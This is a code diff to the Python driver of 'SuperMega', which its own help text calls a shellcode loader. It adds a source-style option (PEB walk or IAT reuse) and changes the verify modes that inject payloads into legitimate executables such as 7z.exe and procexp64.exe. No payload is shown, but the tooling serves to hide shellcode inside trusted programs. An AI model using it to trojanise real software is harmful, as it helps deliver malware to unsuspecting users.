@@ -35,6 +35,7 @@ def main():
     parser = argparse.ArgumentParser(description='SuperMega shellcode loader')
     parser.add_argument('--shellcode', type=str, help='The path to the file of your payload shellcode')
     parser.add_argument('--inject', type=str, help='The path to the file where we will inject ourselves in')
+    parser.add_argument('--sourcestyle', type=str, help='peb_walk or iat_reuse')
     parser.add_argument('--alloc', type=str, help='Template: which allocator plugin')
     parser.add_argument('--decoder', type=str, help='Template: which decoder plugin')
     parser.add_argument('--exec', type=str, help='Template: which exec plugin')
@@ -60,17 +61,20 @@ def main():
         settings.try_start_final_shellcode = False
 
         if args.verify == "peb":
+            settings.source_style = SourceStyle.peb_walk
             settings.inject = True
             settings.inject_mode = 2
             settings.inject_exe_in = "exes/7z.exe"
             settings.inject_exe_out = "out/7z-verify.exe"
         elif args.verify == "iat":
+            settings.source_style = SourceStyle.iat_reuse
             settings.inject = True
-            settings.inject_mode = 1 # 2
+            settings.inject_mode = 2
             settings.inject_exe_in = "exes/procexp64.exe"
             settings.inject_exe_out = "out/procexp64-verify.exe"
         elif args.verify == "rwx":
             settings.inject = True
+            settings.source_style = SourceStyle.peb_walk
             settings.inject_mode = 1  # ,2 is broken atm
             settings.inject_exe_in = "exes/wifiinfoview.exe"
             settings.inject_exe_out = "out/wifiinfoview.exe-verify.exe"
@@ -88,6 +92,12 @@ def main():
 
         if args.short_call_patching:
             settings.short_call_patching = True
+
+        if args.sourcestyle:
+            if args.sourcestyle == "peb_walk":
+                settings.source_style = SourceStyle.peb_walk
+            elif args.sourcestyle == "iat_reuse":
+                settings.source_style = SourceStyle.iat_reuse
 
         if args.alloc:
             if args.alloc == "rwx_1":
@@ -155,7 +165,7 @@ def start(settings: Settings):
 
     # Copy: IAT_REUSE loader C files into working directory: build/
     phases.templater.create_c_from_template(
-        source_style = SourceStyle.iat_reuse,
+        source_style = settings.source_style,
         alloc_style  = settings.alloc_style,
         exec_style   = settings.exec_style,
         decoder_style= settings.decoder_style,
@@ -170,34 +180,14 @@ def start(settings: Settings):
             carrier = project.carrier,
             short_call_patching = project.settings.short_call_patching)
 
-    # Decide if we can use IAT_REUSE (all function calls available as import)
-    if exehost_has_all_carrier_functions(project.carrier, project.exe_host):
-        settings.source_style = SourceStyle.iat_reuse
+    if settings.source_style == SourceStyle.iat_reuse:
         logger.warning("--[ SourceStyle: Using IAT_REUSE".format())
-        # all good, patch ASM
         phases.compiler.fixup_iat_reuse(main_asm_file, project.carrier)
         observer.add_text("carrier_asm_updated", file_readall_text(main_asm_file))
-    else:
-        # Not good, Fall back to PEB_WALK
-        settings.source_style = SourceStyle.peb_walk
-        logger.warning("--[ SourceStyle: Fall back to PEB_WALK".format())
-        observer.clean_files()
-        clean_files()
-        # Copy: PEB_WALK loader C files into working directory: build/
-        phases.templater.create_c_from_template(
-            source_style = SourceStyle.peb_walk,
-            alloc_style  = settings.alloc_style,
-            exec_style   = settings.exec_style,
-            decoder_style= settings.decoder_style,
-            payload_len  = project.payload.len,
-        )
-        # Compile: PEB_WALK C -> ASM
-        if settings.generate_asm_from_c:
-            phases.compiler.compile(
-                c_in = main_c_file, 
-                asm_out = main_asm_file, 
-                payload_len = project.payload.len)
-        observer.add_text("carrier_asm_updated", file_readall_text(main_asm_file))
+
+        if not exehost_has_all_carrier_functions(project.carrier, project.exe_host):
+            logger.error("Error: Not all carrier functions are available in the target exe")
+            return
 
     # Assemble: ASM -> Shellcode
     if settings.generate_shc_from_asm:
@@ -266,15 +256,15 @@ def start(settings: Settings):
                 project.carrier,
                 project.exe_host)
             
+            # Just print, to verify
             code = extract_code_from_exe_file(settings.inject_exe_out)
             pe = pefile.PE(settings.inject_exe_out)
             ep = pe.OPTIONAL_HEADER.AddressOfEntryPoint
             ep_raw = get_physical_address(pe, ep)
             pe.close()
-
             #print("Raw: {} / 0x{:x}".format(
             #    ep_raw, ep_raw))
-            observer.add_code("exe_fucking_final", 
+            observer.add_code("exe_final", 
                 code[ep_raw:ep_raw+300])
             
 
